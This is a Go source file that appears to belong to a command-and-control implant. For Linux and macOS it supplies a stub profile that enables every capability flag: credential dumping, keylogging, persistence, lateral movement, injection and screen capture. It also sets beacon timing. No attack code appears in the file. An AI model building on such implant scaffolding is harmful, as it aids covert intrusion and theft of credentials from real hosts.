//go:build !windows
// +build !windows

package main

// unixEnvDetector is a minimal non-Windows implementation backing the shared
// scheduler references to getEnvDetector().Profile(). Linux/macOS keep a
// permissive default ops profile rather than classifying the environment.
type unixEnvDetector struct{}

func (unixEnvDetector) Profile() *OpsProfile {
	return defaultUnixOpsProfile()
}

func getEnvDetector() *unixEnvDetector { return &unixEnvDetector{} }

func defaultUnixOpsProfile() *OpsProfile {
	return &OpsProfile{
		Class:              EnvCorporate,
		ClassLabel:         "corporate",
		AllowShell:         true,
		AllowInjection:     true,
		AllowCredDump:      true,
		AllowPersistence:   true,
		AllowLateral:       true,
		AllowKeylogger:     true,
		AllowScreenCapture: true,
		AllowTokenOps:      true,
		MaxBeaconJitter:    25,
		MinBeaconInterval:  30,
	}
}

func detectEnvironment() (string, *OpsProfile) {
	p := defaultUnixOpsProfile()
	return p.ClassLabel, p
}